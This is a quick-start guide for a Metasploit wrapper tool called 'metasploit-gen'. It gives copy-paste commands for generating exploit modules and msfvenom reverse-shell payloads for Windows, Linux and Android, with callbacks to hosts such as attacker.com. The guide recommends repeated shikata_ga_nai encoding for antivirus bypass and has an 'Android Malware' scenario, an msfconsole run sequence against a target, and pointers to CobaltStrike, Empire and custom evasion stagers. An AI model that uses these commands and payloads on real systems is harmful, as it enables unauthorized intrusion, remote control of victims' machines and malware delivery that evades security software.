# Metasploit Exploit Generator - Quick Start Guide

## ⚡ 5-Minute Setup

### Linux (Kali)
```bash
sudo bash install_kali.sh
metasploit-gen --help
```

### Windows
```cmd
install_windows.bat
python metasploit_exploit_generator.py --help
```

---

## 🎯 Your First Exploit (2 minutes)

### Step 1: Generate Exploit Module
```bash
metasploit-gen exploit \
  -n "Test Vulnerability" \
  -c CVE-2023-0001 \
  -d "Remote code execution via input validation"
```

**Output:** `generated_modules/test_vulnerability_exploit.rb`

### Step 2: Generate Payload
```bash
metasploit-gen payload \
  -t windows_x64 \
  -l 192.168.1.100 \
  -p 4444 \
  -e shikata_ga_nai
```

**Output:** Shows msfvenom command to execute

### Step 3: Copy to Metasploit
```bash
cp generated_modules/test_vulnerability_exploit.rb ~/.msf4/modules/exploits/custom/
```

### Step 4: Use in msfconsole
```
msfconsole
> use exploits/custom/test_vulnerability_exploit
> set RHOST target.com
> set LHOST 192.168.1.100
> set LPORT 4444
> run
```

---

## 📋 Common Commands

### List Everything
```bash
metasploit-gen list --payloads
metasploit-gen list --encoders
```

### Quick Payload (Copy-Paste)
```bash
metasploit-gen payload -t windows_x64 -l YOUR_IP -p 4444 -e shikata_ga_nai
```

### Test Exploit
```bash
metasploit-gen exploit -n "MyVuln" -c CVE-2023-1234 -d "Test exploit"
```

---

## 🚀 Real-World Scenarios

### Scenario 1: Apache RCE
```bash
metasploit-gen exploit \
  -n "Apache Struts2" \
  -c CVE-2017-5645 \
  -d "OGNL injection RCE"

metasploit-gen payload \
  -t linux_x64 \
  -l attacker.com \
  -p 8888 \
  -e shikata_ga_nai -i 10
```

### Scenario 2: Windows Target (Multi-encoded)
```bash
metasploit-gen payload \
  -t windows_x64 \
  -l 10.10.10.50 \
  -p 4444 \
  -e shikata_ga_nai \
  -i 5 \
  -f exe
```

### Scenario 3: Android Malware
```bash
metasploit-gen payload \
  -t android \
  -l attacker.com \
  -p 9999
```

---

## 🛠️ Troubleshooting

| Error | Solution |
|-------|----------|
| "Python not found" | Install Python 3.7+ from python.org |
| "colorama not found" | Run: `pip install colorama` |
| "Permission denied" | Run: `chmod +x install_kali.sh` |
| "msfvenom not found" | Install: `sudo apt install metasploit-framework` |

---

## 💡 Pro Tips

1. **Always test locally first**
   ```bash
   # Create isolated test environment
   docker run -it ubuntu:20.04 bash
   ```

2. **Use multiple encoders for AV bypass**
   ```bash
   metasploit-gen payload -t windows_x64 -l IP -p PORT -e shikata_ga_nai -i 10
   ```

3. **Save your commands**
   ```bash
   # Output includes payload_commands.txt
   cat generated_modules/payload_commands.txt
   ```

4. **Automate with msfconsole resource file**
   ```bash
   # Use payload_commands.txt as resource
   resource payload_commands.txt
   ```

---

## 📞 Quick Reference

### Payload Types
- `windows_x86`, `windows_x64`
- `linux_x86`, `linux_x64`
- `android`, `web_php`, `web_asp`, `python`

### Encoders
- `shikata_ga_nai` (best for AV bypass)
- `fnstenv_mov`, `jmp_call_additive`, `xor_dynamic`

### Output Formats
- `exe` (Windows executable)
- `elf` (Linux executable)
- `apk` (Android package)
- `php`, `asp`, `python`

---

## 🔒 Security Checklist

Before deployment:
- [ ] Target authorization confirmed
- [ ] Payload tested in isolated lab
- [ ] Listener ready on attacker machine
- [ ] Network path validated
- [ ] Backup communication method ready
- [ ] Incident response plan in place

---

## 📚 Next Steps

1. Read full README.md for advanced features
2. Check generated modules for structure
3. Modify modules for custom exploitation
4. Integrate with CobaltStrike / Empire
5. Create custom evasion stagers

---

**Questions?** See README.md or run `metasploit-gen --help`

**Ready to go!** 🚀
